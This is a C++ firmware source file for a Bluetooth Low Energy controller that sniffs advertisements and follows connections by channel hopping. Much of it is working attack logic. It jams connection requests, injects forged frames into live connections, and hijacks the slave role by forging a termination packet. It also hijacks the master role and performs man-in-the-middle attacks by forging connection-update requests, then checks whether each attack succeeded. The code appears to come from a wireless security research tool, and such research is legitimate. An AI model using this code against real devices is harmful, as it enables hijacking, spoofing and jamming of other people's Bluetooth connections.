#include "blecontroller.h"
#include "../core.h"

int BLEController::channelToFrequency(int channel) {
	int freq = 0;
	if (channel == 37) freq = 2;
	else if (channel == 38) freq = 26;
	else if (channel == 39) freq = 80;
	else if (channel < 11) freq = 2*(channel+2);
	else freq = 2*(channel+3);
	return freq;
}

BLEController::BLEController(Radio *radio) : Controller(radio) {
	this->timeModule = Core::instance->getTimeModule();
}

void BLEController::setFollowMode(bool follow) {
	this->follow = follow;
}

void BLEController::setEmptyTransmitIndicator(bool emptyTransmitIndicator) {
	this->emptyTransmitIndicator = emptyTransmitIndicator;
}


int BLEController::getChannel() {
	return this->channel;
}
void BLEController::setChannel(int channel) {
	if (channel == 37 || channel == 38 || channel == 39) this->lastAdvertisingChannel = channel;
	this->channel = channel;
	this->radio->fastFrequencyChange(BLEController::channelToFrequency(channel),channel);
}

void BLEController::updateHopInterval(uint16_t hopInterval) {
	// This method update the hop interval in use
	this->hopInterval = hopInterval;
	this->timeModule->setBLEHopInterval(hopInterval);
}

void BLEController::updateHopIncrement(uint8_t hopIncrement) {
	// This method update the hop increment in use
	this->hopIncrement = hopIncrement;
}

void BLEController::updateChannelsInUse(uint8_t* channelMap) {
	// This method extracts the channels in use from the channel map and build the remapping Table
	this->numUsedChannels = 0;
	for (int i=0; i<5; i++) {
		for (int j=0; j<8; j++) {
			if ((8*i + j) < 37) {
				if (channelMap[i] & (1<<j)) {
					this->channelsInUse[8*i + j] = true;
					this->numUsedChannels++;
				}
				else {
					this->channelsInUse[8*i + j] = false;
				}
			}
		}
	}
	if (this->remappingTable != NULL) free(this->remappingTable);
	this->remappingTable = (int*)malloc(sizeof(int)* this->numUsedChannels);
	int j=0;
	for (int i=0;i<37;i++) {
		if (this->channelsInUse[i]) {
			this->remappingTable[j] = i;
			j++;
		}
	}
}


int BLEController::nextChannel() {
	// This method calculates the next channel using Channel Selection Algorithm #1
	this->unmappedChannel = (this->lastUnmappedChannel + this->hopIncrement) % 37;
	this->lastUnmappedChannel = this->unmappedChannel;
	if (this->channelsInUse[this->unmappedChannel]) {
		return this->unmappedChannel;
	}
	else {
		int remappingIndex = this->unmappedChannel % this->numUsedChannels;
		return this->remappingTable[remappingIndex];
	}
}

void BLEController::clearConnectionUpdate() {
	this->connectionUpdate.type = UPDATE_TYPE_NONE;
	this->connectionUpdate.instant = 0;
	this->connectionUpdate.hopInterval = 0;
	this->connectionUpdate.windowSize = 0;
	this->connectionUpdate.windowOffset = 0;
	this->connectionUpdate.channelMap[0] = 0;
	this->connectionUpdate.channelMap[1] = 0;
	this->connectionUpdate.channelMap[2] = 0;
	this->connectionUpdate.channelMap[3] = 0;
	this->connectionUpdate.channelMap[4] = 0;
}

void BLEController::prepareConnectionUpdate(uint16_t instant, uint16_t hopInterval, uint8_t windowSize, uint8_t windowOffset,uint16_t latency) {
	this->connectionUpdate.type = UPDATE_TYPE_CONNECTION_UPDATE_REQUEST;
	this->connectionUpdate.instant = instant;
	this->connectionUpdate.hopInterval = hopInterval;
	this->connectionUpdate.windowSize = windowSize;
	this->connectionUpdate.windowOffset = windowOffset;
	this->connectionUpdate.channelMap[0] = 0;
	this->connectionUpdate.channelMap[1] = 0;
	this->connectionUpdate.channelMap[2] = 0;
	this->connectionUpdate.channelMap[3] = 0;
	this->connectionUpdate.channelMap[4] = 0;
	this->latency = latency;
}

void BLEController::prepareConnectionUpdate(uint16_t instant, uint8_t *channelMap) {
	this->connectionUpdate.type = UPDATE_TYPE_CHANNEL_MAP_REQUEST;
	this->connectionUpdate.instant = instant;
	this->connectionUpdate.hopInterval = 0;
	this->connectionUpdate.windowSize = 0;
	this->connectionUpdate.windowOffset = 0;
	for (int i=0;i<5;i++) this->connectionUpdate.channelMap[i] = channelMap[i];

}

void BLEController::updateMasterSequenceNumbers(uint8_t sn, uint8_t nesn) {
	this->masterSequenceNumbers.sn = sn;
	this->masterSequenceNumbers.nesn = nesn;
}

void BLEController::updateSlaveSequenceNumbers(uint8_t sn, uint8_t nesn) {
	this->slaveSequenceNumbers.sn = sn;
	this->slaveSequenceNumbers.nesn = nesn;
}

void BLEController::updateSimulatedMasterSequenceNumbers(uint8_t sn, uint8_t nesn) {
	this->simulatedMasterSequenceNumbers.sn = sn;
	this->simulatedMasterSequenceNumbers.nesn = nesn;
}

void BLEController::updateSimulatedSlaveSequenceNumbers(uint8_t sn, uint8_t nesn) {
	this->simulatedSlaveSequenceNumbers.sn = sn;
	this->simulatedSlaveSequenceNumbers.nesn = nesn;
}
void BLEController::updateInjectedSequenceNumbers(uint8_t sn, uint8_t nesn) {
	this->attackStatus.injectedSequenceNumbers.sn = sn;
	this->attackStatus.injectedSequenceNumbers.nesn = nesn;
}

void BLEController::applyConnectionUpdate() {
	if (this->connectionUpdate.type != UPDATE_TYPE_NONE && this->connectionEventCount == this->connectionUpdate.instant) {
		if (this->connectionUpdate.type == UPDATE_TYPE_CONNECTION_UPDATE_REQUEST) {
			this->updateHopInterval(this->connectionUpdate.hopInterval);
			this->timeModule->setBLEAnchorPoint(this->timeModule->lastAnchorPoint);
			this->sync = false;
		}
		else if (this->connectionUpdate.type == UPDATE_TYPE_CHANNEL_MAP_REQUEST) {
			this->updateChannelsInUse(this->connectionUpdate.channelMap);
		}
		this->clearConnectionUpdate();
	}
}
void BLEController::setAttackPayload(uint8_t *payload, size_t size) {
	for (size_t i=0;i<size;i++) {
		this->attackStatus.payload[i] = payload[i];
	}
	this->attackStatus.size = size;
}

void BLEController::setSlavePayload(uint8_t *payload, size_t size) {
	for (size_t i=0;i<size;i++) {
		this->slavePayload.payload[i] = payload[i];
	}
	this->slavePayload.size = size;
	this->slavePayload.transmitted = false;
}

void BLEController::setMasterPayload(uint8_t *payload, size_t size) {
	for (size_t i=0;i<size;i++) {
		this->masterPayload.payload[i] = payload[i];
	}
	this->masterPayload.size = size;
	this->masterPayload.transmitted = false;
}

bool BLEController::connectionLost() {
	// Stop the timers
	this->timeModule->exitBLEConnection();
	// We are not synchronized anymore
	this->sync = false;
	// We are not waiting for an update
	this->clearConnectionUpdate();
	// If we were simulating slave, exit slave mode
	if (this->controllerState == SIMULATING_SLAVE || this->controllerState == PERFORMING_MITM) this->exitSlaveMode();

	//We are sending a notification to Host
	this->sendConnectionReport(CONNECTION_LOST);
	// Reconfigure radio to receive advertisements
	this->setHardwareConfiguration(0x8e89bed6,0x555555);
	// Reset the channel
	this->setChannel(this->lastAdvertisingChannel);

	this->controllerState = SNIFFING_ADVERTISEMENTS;

	Core::instance->getLedModule()->off(LED2);
	return false;
}

bool BLEController::goToNextChannel() {

	if (this->controllerState != SNIFFING_ADVERTISEMENTS) {
		// If we have not observed at least one packet, increase desyncCounter by one, otherwise resets this counter
		this->desyncCounter = (this->packetCount == 0 ? this->desyncCounter + 1 : 0);
		// If the desyncCounter is greater than three, the connection is considered lost
		if (this->desyncCounter > 3 && !this->attackStatus.running) {
			return this->connectionLost();
		}
		// If we are still following the connection
		else {
			this->checkAttackSuccess();
			this->lastPacketCount = this->packetCount;
			this->packetCount = 0;
			this->connectionEventCount++;

			// Check if we have a connection update and apply it if necessary
			this->applyConnectionUpdate();

			// Go to the next channel
			int channel = this->nextChannel();
			this->setChannel(channel);

			this->executeAttack();
		}
		return (this->desyncCounter <= 3);
	}
	return false;

}
void BLEController::start() {
	this->remappingTable = NULL;
	this->channel = 37;
	this->lastAdvertisingChannel = 37;
	this->follow = true;
	this->controllerState = SNIFFING_ADVERTISEMENTS;
	this->setHardwareConfiguration(0x8e89bed6,0x555555);
}

bool BLEController::whitelistAdvAddress(bool enable,uint8_t a, uint8_t b, uint8_t c,uint8_t d, uint8_t e, uint8_t f) {
	if (this->controllerState == JAMMING_CONNECT_REQ) {
		uint8_t jammingPattern[] = {dewhiten_byte_ble(f,8,this->channel),
						dewhiten_byte_ble(e,9,this->channel),
						dewhiten_byte_ble(d,10,this->channel),
						dewhiten_byte_ble(c,11,this->channel),
						dewhiten_byte_ble(b,12,this->channel),
						dewhiten_byte_ble(a,13,this->channel)};

		uint8_t jammingMask[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
		if (enable) this->radio->addJammingPattern(jammingPattern,jammingMask,6,7);
		else this->radio->removeJammingPattern(jammingPattern,jammingMask,6,7);
		return true;
	}
	return false;
}

bool BLEController::whitelistInitAddress(bool enable,uint8_t a, uint8_t b, uint8_t c,uint8_t d, uint8_t e, uint8_t f) {
	if (this->controllerState == JAMMING_CONNECT_REQ) {
		uint8_t jammingPattern[] = {dewhiten_byte_ble(f,2,this->channel),
						dewhiten_byte_ble(e,3,this->channel),
						dewhiten_byte_ble(d,4,this->channel),
						dewhiten_byte_ble(c,5,this->channel),
						dewhiten_byte_ble(b,6,this->channel),
						dewhiten_byte_ble(a,7,this->channel)};

		uint8_t jammingMask[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
		if (enable) this->radio->addJammingPattern(jammingPattern,jammingMask,6,1);
		else this->radio->removeJammingPattern(jammingPattern,jammingMask,6,1);
		return true;
	}
	return false;
}


bool BLEController::whitelistConnection(bool enable,uint8_t a, uint8_t b, uint8_t c,uint8_t d, uint8_t e, uint8_t f,uint8_t ap, uint8_t bp, uint8_t cp,uint8_t dp, uint8_t ep, uint8_t fp) {
	if (this->controllerState == JAMMING_CONNECT_REQ) {
		uint8_t jammingPattern[] = {dewhiten_byte_ble(f,2,this->channel),
						dewhiten_byte_ble(e,3,this->channel),
						dewhiten_byte_ble(d,4,this->channel),
						dewhiten_byte_ble(c,5,this->channel),
						dewhiten_byte_ble(b,6,this->channel),
						dewhiten_byte_ble(a,7,this->channel),
						dewhiten_byte_ble(fp,8,this->channel),
						dewhiten_byte_ble(ep,9,this->channel),
						dewhiten_byte_ble(dp,10,this->channel),
						dewhiten_byte_ble(cp,11,this->channel),
						dewhiten_byte_ble(bp,12,this->channel),
						dewhiten_byte_ble(ap,13,this->channel)};

		uint8_t jammingMask[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
		if (enable) this->radio->addJammingPattern(jammingPattern,jammingMask,12,1);
		else this->radio->removeJammingPattern(jammingPattern,jammingMask,12,1);
		return true;
	}
	return false;
}

void BLEController::stop() {
	this->radio->disable();
}

void BLEController::setJammerConfiguration() {
	this->controllerState = JAMMING_CONNECT_REQ;
	uint8_t connectReq[4] = {dewhiten_byte_ble(0x05,0,this->channel),0x8e,0x89,0xbe};
	this->radio->setPrefixes(dewhiten_byte_ble(0x45,0,this->channel), dewhiten_byte_ble(0x85,0,this->channel), dewhiten_byte_ble(0xc5,0,this->channel));
	this->radio->setPreamble(connectReq,4);
	this->radio->setMode(MODE_JAMMER);
	this->radio->setFastRampUpTime(true);
	this->radio->setEndianness(LITTLE);
	this->radio->setTxPower(POS8_DBM);
	this->radio->disableRssi();
	this->radio->setPhy(BLE_1MBITS);
	this->radio->setHeader(0,0,0);
	this->radio->setWhitening(NO_WHITENING);
	this->radio->setJammingPatternsCounter(8+2*6*8);
	this->radio->enableJammingPatterns();
	this->radio->setCrc(NO_CRC);
	this->radio->setCrcSkipAddress(false);
	this->radio->setCrcSize(0);
	this->radio->setPayloadLength(20);
	this->radio->setInterFrameSpacing(0);
	this->radio->setExpandPayloadLength(20);
	this->radio->setFrequency(BLEController::channelToFrequency(channel));
	this->radio->reload();
}



void BLEController::setHardwareConfiguration(uint32_t accessAddress, uint32_t crcInit) {
	this->accessAddress = accessAddress;
	this->crcInit = crcInit;
	uint8_t accessAddressPreamble[4] = {(uint8_t)((accessAddress & 0xFF000000) >> 24),
						(uint8_t)((accessAddress & 0x00FF0000) >> 16),
						(uint8_t)((accessAddress & 0x0000FF00) >> 8),
						(uint8_t)(accessAddress & 0x000000FF)};
	this->radio->setPreamble(accessAddressPreamble,4);
	this->radio->setPrefixes();
	this->radio->setMode(MODE_NORMAL);
	this->radio->setFastRampUpTime(true);
	this->radio->setEndianness(LITTLE);
	this->radio->setTxPower(POS8_DBM);
	this->radio->disableRssi();
	this->radio->setPhy(BLE_1MBITS);
	this->radio->setHeader(1,8,0);
	this->radio->setWhitening(HARDWARE_WHITENING);
	this->radio->setWhiteningDataIv(this->channel);
	this->radio->disableJammingPatterns();
	this->radio->setCrc(HARDWARE_CRC);
	this->radio->setCrcSkipAddress(true);
	this->radio->setCrcSize(3);
	this->radio->setCrcInit(crcInit);
	this->radio->setCrcPoly(0x100065B);
	this->radio->setPayloadLength(40);
	this->radio->setInterFrameSpacing(0);
	this->radio->setExpandPayloadLength(0);
	this->radio->setFrequency(BLEController::channelToFrequency(channel));
	this->radio->reload();
}



void BLEController::followAdvertisingDevice(uint8_t a,uint8_t b,uint8_t c,uint8_t d,uint8_t e,uint8_t f) {
	this->controllerState = COLLECTING_ADVINTERVAL;
	this->setFilter(a,b,c,d,e,f);
	this->collectedIntervals = 0;
	this->setChannel(37);
}

void BLEController::calculateAdvertisingIntervals() {
	this->controllerState = SNIFFING_ADVERTISEMENTS;
	uint32_t intervals[ADV_REPORT_SIZE];
	for (int i=0;i<ADV_REPORT_SIZE;i++) {
		intervals[i] = this->timestampsThirdChannel[i] - this->timestampsFirstChannel[i];
	}
	sort_array(intervals,ADV_REPORT_SIZE);
	int firstQuartile = (int)((1/4)*(25+1));
	this->sendAdvIntervalReport((uint32_t)(intervals[firstQuartile]/2));
	this->collectedIntervals = 0;
}
void BLEController::setFilter(uint8_t a,uint8_t b,uint8_t c,uint8_t d,uint8_t e,uint8_t f) {
	this->filter.bytes[0] = a;
	this->filter.bytes[1] = b;
	this->filter.bytes[2] = c;
	this->filter.bytes[3] = d;
	this->filter.bytes[4] = e;
	this->filter.bytes[5] = f;
}

void BLEController::followConnection(uint16_t hopInterval, uint8_t hopIncrement, uint8_t *channelMap,uint32_t accessAddress,uint32_t crcInit,  int masterSCA,uint16_t latency) {
	// We update the parameters needed to follow the connection
	this->updateHopInterval(hopInterval);
	this->updateHopIncrement(hopIncrement);
	this->updateChannelsInUse(channelMap);

	this->controllerState = SNIFFING_CONNECTION;

	this->latency = latency;

	this->packetCount = 0;
	this->connectionEventCount = 0;

	// Reset attack status
	this->attackStatus.attack = BLE_ATTACK_NONE;
	this->attackStatus.running = false;
	this->attackStatus.injecting = false;
	this->attackStatus.successful = false;

	// Initially, we are not synchronized
	this->sync = false;

	// This counter indicates if we have lost the connection
	this->desyncCounter = 0;


	// We calculate the first channel
	this->lastUnmappedChannel = 0;
	this->channel = this->nextChannel();

	// No connection update is expected
	this->clearConnectionUpdate();

	// Radio configuration
	this->setHardwareConfiguration(accessAddress, crcInit);


	// Timers configuration
	this->timeModule->followBLEConnection(this->hopInterval,masterSCA, (CtrlCallback)&BLEController::goToNextChannel,(CtrlCallback)&BLEController::inject,(CtrlCallback)&BLEController::masterRoleCallback, this);
	this->sendConnectionReport(CONNECTION_STARTED);
}

void BLEController::startAttack(BLEAttack attack) {
	this->slavePayload.transmitted = true;
	this->masterPayload.transmitted = true;

	this->attackStatus.attack = attack;
	this->attackStatus.running = true;
	this->attackStatus.successful = false;
	this->attackStatus.injecting = false;
	this->attackStatus.injectionCounter = 0;
	this->controllerState = INJECTING;
	this->sendConnectionReport(ATTACK_STARTED);
	if (attack == BLE_ATTACK_SLAVE_HIJACKING) {
		//this->readRequest = false;
		this->attackStatus.hijackingCounter = 0;
		uint8_t *terminate_ind;
		size_t terminate_ind_size;
		//uint8_t terminate_ind[4] = {0x03,0x02,0x02,0x13};
		//size_t terminate_ind_size = 4;
		BLEPacket::forgeTerminateInd(&terminate_ind, &terminate_ind_size,0x13);
		this->setAttackPayload(terminate_ind,terminate_ind_size);
		free(terminate_ind);
	}
	else if (attack == BLE_ATTACK_MASTER_HIJACKING || attack == BLE_ATTACK_MITM) {
		this->attackStatus.nextInstant = this->connectionEventCount + 150;
		uint8_t *connection_update;
		size_t connection_update_size;
		BLEPacket::forgeConnectionUpdateRequest(&connection_update,
							&connection_update_size,
							7 /* WinSize */,
							1 /* WinOffset */,
							this->hopInterval /* Hop Interval */,
							0 /* Latency */,
							600 /*timeout*/,
							this->attackStatus.nextInstant /* Instant */);
		this->setAttackPayload(connection_update, connection_update_size);
		free(connection_update);
	}
}

bool BLEController::isSlavePayloadTransmitted() {
	return this->slavePayload.transmitted;
}
bool BLEController::isMasterPayloadTransmitted() {
	return this->masterPayload.transmitted;
}

void BLEController::executeAttack() {
	if (this->attackStatus.running && !this->attackStatus.successful) {
		TimeModule::instance->startBLEInjection();
	}
}
bool BLEController::masterRoleCallback(BLEPacket *pkt) {
	this->updateSimulatedMasterSequenceNumbers(this->slaveSequenceNumbers.nesn, (this->simulatedMasterSequenceNumbers.nesn + 1) % 2);
	if (!this->masterPayload.transmitted) {
		this->masterPayload.payload[0] = (this->masterPayload.payload[0] & 0xF3) | (this->simulatedMasterSequenceNumbers.nesn  << 2) | (this->simulatedMasterSequenceNumbers.sn << 3);
		this->radio->send(this->masterPayload.payload,this->masterPayload.size,BLEController::channelToFrequency(this->channel),this->channel);
	}
	else {
		uint8_t data1[2];
		data1[0] = (0x01 & 0xF3) | (this->simulatedMasterSequenceNumbers.nesn  << 2) | (this->simulatedMasterSequenceNumbers.sn << 3);
		data1[1] = 0x00;
		this->radio->send(data1,10,BLEController::channelToFrequency(this->channel),this->channel);
	}
	return false;
}

bool BLEController::slaveRoleCallback(BLEPacket *pkt) {
	this->updateSimulatedSlaveSequenceNumbers(this->masterSequenceNumbers.nesn, (this->simulatedSlaveSequenceNumbers.nesn + 1) % 2);

	if (!this->slavePayload.transmitted) {
		this->slavePayload.payload[0] = (this->slavePayload.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3);
		this->radio->updateTXBuffer(this->slavePayload.payload,this->slavePayload.size);
		this->slavePayload.transmitted = true;
		Core::instance->pushMessageToQueue(new SendPayloadResponse(0x02,true));
	}
	else {
		uint8_t tx_buffer[2];
		tx_buffer[0] = (0x01 & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3);
		tx_buffer[1] = 0x00;
		this->radio->updateTXBuffer(tx_buffer,2);
	}
	return false;
}

void BLEController::checkAttackSuccess() {
	// We check if the injection was successful
	if (this->attackStatus.attack == BLE_ATTACK_FRAME_INJECTION || this->attackStatus.attack == BLE_ATTACK_MASTER_HIJACKING || this->attackStatus.attack == BLE_ATTACK_MITM) {
		if (this->attackStatus.injecting) {
			if (this->attackStatus.injectionTimestamp + 150 + ((1+4+this->attackStatus.size+3)*8) - 5 < this->lastSlaveTimestamp &&
			this->attackStatus.injectionTimestamp + 150 + ((1+4+this->attackStatus.size+3)*8) + 5 > this->lastSlaveTimestamp &&
			this->attackStatus.injectedSequenceNumbers.nesn == this->slaveSequenceNumbers.sn &&
			((this->attackStatus.injectedSequenceNumbers.sn + 1)%2) == this->slaveSequenceNumbers.nesn
			) {
				if (!this->attackStatus.successful) {
					TimeModule::instance->stopBLEInjection();
					this->sendInjectionReport(true,this->attackStatus.injectionCounter);

					if (this->attackStatus.attack == BLE_ATTACK_FRAME_INJECTION) {
						Core::instance->getLedModule()->on(LED2);
						Core::instance->getLedModule()->setColor(GREEN);
					}
				}
				this->attackStatus.running = false;
				this->attackStatus.successful = true;
			}
			this->attackStatus.injecting = false;
		}

	}
	// In the specific case of slave hijacking, we relies on an hijacking counter to check the attack success
	else if (this->attackStatus.attack == BLE_ATTACK_SLAVE_HIJACKING) {
		this->attackStatus.hijackingCounter = (this->packetCount <= 1 ? this->attackStatus.hijackingCounter + 1 : 0);
		if (this->attackStatus.hijackingCounter > (uint32_t)(this->latency + 2)) {
			if (!this->attackStatus.successful)  {
				//We are sending a notification to Host
				this->sendConnectionReport(ATTACK_SUCCESS);
				Core::instance->getLedModule()->on(LED2);
				Core::instance->getLedModule()->setColor(GREEN);

				TimeModule::instance->stopBLEInjection();
				this->controllerState = SIMULATING_SLAVE;
				this->enterSlaveMode();
			}
			this->attackStatus.running = false;
			this->attackStatus.successful = true;
		}
		this->attackStatus.injecting = false;
	}

	if (this->attackStatus.attack == BLE_ATTACK_MASTER_HIJACKING) {
		if (this->attackStatus.successful) {
			if (this->controllerState == INJECTING) {
				TimeModule::instance->enterBLEMasterMode();
				this->setEmptyTransmitIndicator(false);
				this->controllerState = SYNCHRONIZING_MASTER;
				this->sync = false;
			}
		}
		if (this->attackStatus.nextInstant + 10 == this->connectionEventCount) {
			if (this->controllerState == SIMULATING_MASTER) { // attack successful
				// Successful attack !
				//We are sending a notification to Host
				this->sendConnectionReport(ATTACK_SUCCESS);
				Core::instance->getLedModule()->on(LED2);
				Core::instance->getLedModule()->setColor(GREEN);
			}
			else {
				// Attack failed
				this->controllerState = SNIFFING_CONNECTION;
				this->attackStatus.attack = BLE_ATTACK_NONE;
				//We are sending a notification to Host
				this->sendConnectionReport(ATTACK_FAILURE);
				Core::instance->getLedModule()->on(LED2);
				Core::instance->getLedModule()->setColor(RED);
			}
		}

	}
	else if (this->attackStatus.attack == BLE_ATTACK_MITM) {
		if (this->attackStatus.successful) {
			if (this->controllerState == INJECTING) {
				TimeModule::instance->enterBLEMasterMode();
				this->setEmptyTransmitIndicator(false);
				this->controllerState = SYNCHRONIZING_MITM;
				this->sync = false;
			}
			else if (this->controllerState == PERFORMING_MITM) {
				this->enterSlaveMode();
			}
		}
		if (this->attackStatus.nextInstant + 10 == this->connectionEventCount) {
			if (this->controllerState == PERFORMING_MITM) { // attack successful
				// Successful attack !
				//We are sending a notification to Host
				this->sendConnectionReport(ATTACK_SUCCESS);
				Core::instance->getLedModule()->on(LED2);
				Core::instance->getLedModule()->setColor(GREEN);
			}
			else {
				// Attack failed
				this->controllerState = SNIFFING_CONNECTION;
				this->attackStatus.attack = BLE_ATTACK_NONE;
				//We are sending a notification to Host
				this->sendConnectionReport(ATTACK_FAILURE);
				Core::instance->getLedModule()->on(LED2);
				Core::instance->getLedModule()->setColor(RED);
			}
		}
	}
}


void BLEController::enterSlaveMode() {
	this->radio->setFastRampUpTime(false);
	this->radio->setInterFrameSpacing(145);
	this->radio->enableAutoTXafterRX();
	this->radio->reload();
}


void BLEController::exitSlaveMode() {
	this->radio->setFastRampUpTime(true);
	this->radio->setInterFrameSpacing(0);
	this->radio->disableAutoTXafterRX();
	this->radio->reload();
}

bool BLEController::inject() {

	if (this->attackStatus.attack != BLE_ATTACK_NONE) {
		if (!this->attackStatus.injecting) {
			uint8_t *payload = (uint8_t *)malloc(sizeof(uint8_t) * this->attackStatus.size);
			for (size_t i=0;i<this->attackStatus.size;i++) payload[i] = this->attackStatus.payload[i];
			payload[0] = (payload[0] & 0xF3) | (((this->slaveSequenceNumbers.sn+1)%2) << 2)|(this->slaveSequenceNumbers.nesn << 3);
			this->attackStatus.injectionTimestamp = TimeModule::instance->getTimestamp();
			this->radio->send(payload,this->attackStatus.size,BLEController::channelToFrequency(this->channel),this->channel);
			Core::instance->getLedModule()->toggle(LED2);
			this->updateInjectedSequenceNumbers(this->slaveSequenceNumbers.nesn,(this->slaveSequenceNumbers.sn+1)%2);
			this->attackStatus.injectionCounter++;
			this->attackStatus.injecting = true;

			free(payload);
		}
	}
	return false;
}
void BLEController::sendInjectionReport(bool status, uint32_t injectionCount) {
	Core::instance->pushMessageToQueue(new InjectionReportNotification(status, injectionCount));
}

void BLEController::sendAdvIntervalReport(uint32_t interval) {
	Core::instance->pushMessageToQueue(new AdvIntervalReportNotification(interval));
}

void BLEController::sendConnectionReport(ConnectionStatus status) {
	Core::instance->pushMessageToQueue(new ConnectionNotification(status));
}

void BLEController::onReceive(uint32_t timestamp, uint8_t size, uint8_t *buffer, CrcValue crcValue, uint8_t rssi) {
	if (crcValue.validity == VALID_CRC) {
		BLEPacket *pkt = new BLEPacket(this->accessAddress,buffer, size,timestamp, (this->accessAddress != 0x8e89bed6 ? timestamp - this->timeModule->getLastBLEAnchorPoint() : 0), 0, this->channel,rssi, crcValue);
		if (pkt->isAdvertisement()) {
			if (this->controllerState == COLLECTING_ADVINTERVAL && pkt->checkAdvertiserAddress(this->filter)) {
				if (this->getChannel() == 37) {
					this->timestampsFirstChannel[this->collectedIntervals] = timestamp;
					this->setChannel(39);
				}
				else if (this->getChannel() == 39){
					this->timestampsThirdChannel[this->collectedIntervals] = timestamp;
					this->collectedIntervals++;
					if (this->collectedIntervals == ADV_REPORT_SIZE) {
					this->calculateAdvertisingIntervals();
					}
					this->setChannel(37);
				}
			}
			else if (this->controllerState == SNIFFING_ADVERTISEMENTS) {
				if (pkt->checkAdvertiserAddress(this->filter)) {
					pkt->updateSource(0);
					this->addPacket(pkt);
					// We receive a CONNECT_REQ and the follow mode is enabled...
					if (pkt->extractAdvertisementType() == CONNECT_REQ && this->follow) {
						this->setEmptyTransmitIndicator(true);
						// Start following the connection
						this->followConnection(
						pkt->extractHopInterval(),
						pkt->extractHopIncrement(),
						pkt->extractChannelMap(),
						pkt->extractAccessAddress(),
						pkt->extractCrcInit(),
						pkt->extractSCA(),
						pkt->extractLatency()
						);
					}
				}
			}
		}
		else  {
			this->packetCount++;
			// We receive a connection update request ....
			if (pkt->isLinkLayerConnectionUpdateRequest()) {
				// prepare a new update
				this->prepareConnectionUpdate(pkt->extractInstant(),pkt->extractHopInterval(),pkt->extractWindowSize(), pkt->extractWindowOffset(),pkt->extractLatency());
			}
			// We receive a channel map request ...
			if (pkt->isLinkLayerChannelMapRequest()) {
				// prepare a new update
				this->prepareConnectionUpdate(pkt->extractInstant(),pkt->extractChannelMap());
				if (this->controllerState == PERFORMING_MITM) {
					uint8_t *channel_map_request;
					size_t channel_map_request_size;
					BLEPacket::forgeChannelMapRequest(&channel_map_request, &channel_map_request_size,pkt->extractInstant(),pkt->extractChannelMap());
					this->setMasterPayload(channel_map_request,channel_map_request_size);
				}
			}
			if (pkt->isLinkLayerTerminateInd()) {
				this->connectionLost();
			}
			if (this->controllerState != SIMULATING_MASTER) {
				// We sync on a master packet
				if (!this->sync) {
					this->sync = true;
					this->lastMasterTimestamp = timestamp;
					Core::instance->getLedModule()->toggle(LED1);
					this->updateMasterSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
					this->timeModule->setBLEAnchorPoint(timestamp);
					pkt->updateSource(1);
				}
				else {
					// If we received the packet before anchorPoint us, it's a master packet
					if (timestamp - this->timeModule->lastAnchorPoint < 100) {
						this->lastMasterTimestamp = timestamp;
						this->updateMasterSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
						this->timeModule->setBLEAnchorPoint(timestamp);
						// If we are simulating the slave, execute the callback
						if (this->controllerState == SIMULATING_SLAVE || this->controllerState == PERFORMING_MITM) {
							this->slaveRoleCallback(pkt);
						}
						pkt->updateSource(1);
					}
					// If we received the packet between anchorPoint + 100us and anchorPoint + 400 us, it's a slave packet
					else if (timestamp - this->timeModule->lastAnchorPoint >= 100 && timestamp - this->timeModule->lastAnchorPoint < 500) {
						this->lastSlaveTimestamp = timestamp;
						this->updateSlaveSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
						pkt->updateSource(2);
					}
					else if ((this->controllerState == SYNCHRONIZING_MASTER || this->controllerState == SYNCHRONIZING_MITM || this->controllerState == PERFORMING_MITM) && timestamp - this->timeModule->lastAnchorPoint > 2*1250) {
						if (this->controllerState == SYNCHRONIZING_MASTER) {
							this->controllerState = SIMULATING_MASTER;
							this->lastMasterTimestamp = timestamp - 350;
							this->timeModule->setBLEMasterTime(this->hopInterval * 1250 - 10);
							this->timeModule->setBLEAnchorPoint(this->lastMasterTimestamp);
						}
						else if (this->controllerState == SYNCHRONIZING_MITM) {
							this->lastSlaveTimestamp = timestamp;
							this->updateSlaveSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
							this->controllerState = PERFORMING_MITM;
						}
						else if (this->controllerState == PERFORMING_MITM) {
							this->exitSlaveMode();
							this->lastSlaveTimestamp = timestamp;
							this->updateSlaveSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
							if (!this->masterPayload.transmitted && pkt->extractNESN() != this->simulatedMasterSequenceNumbers.sn) {
								this->masterPayload.transmitted = true;
								Core::instance->pushMessageToQueue(new SendPayloadResponse(0x01,true));
							}
						}
						pkt->updateSource(2);
					}
					else if (this->packetCount == 1) {
						this->lastMasterTimestamp = timestamp;
						this->updateMasterSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
					}
					else if (this->packetCount == 2) {
						this->lastSlaveTimestamp = timestamp;
						this->updateSlaveSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
					}
				}
			}
			else {
				if (timestamp - this->timeModule->lastAnchorPoint >= 100 && timestamp - this->timeModule->lastAnchorPoint < 600) {
					this->lastSlaveTimestamp = timestamp;
					this->updateSlaveSequenceNumbers(pkt->extractSN(),pkt->extractNESN());
					this->timeModule->setBLEAnchorPoint(timestamp - 150 - (this->masterPayload.transmitted ? 80 : 8*(this->masterPayload.size+4+3+1)));
					pkt->updateSource(2);
					if (!this->masterPayload.transmitted && pkt->extractNESN() != this->simulatedMasterSequenceNumbers.sn) {
						this->masterPayload.transmitted = true;
						Core::instance->pushMessageToQueue(new SendPayloadResponse(0x01,true));
					}
				}
			}

			if (pkt->extractPayloadLength() > 2 || this->emptyTransmitIndicator) {
				this->addPacket(pkt);
			}
		}
	}
}

void BLEController::onJam(uint32_t timestamp) {
	if (this->controllerState == JAMMING_CONNECT_REQ) {
		Core::instance->sendDebug("JAMMED !");
	}
}
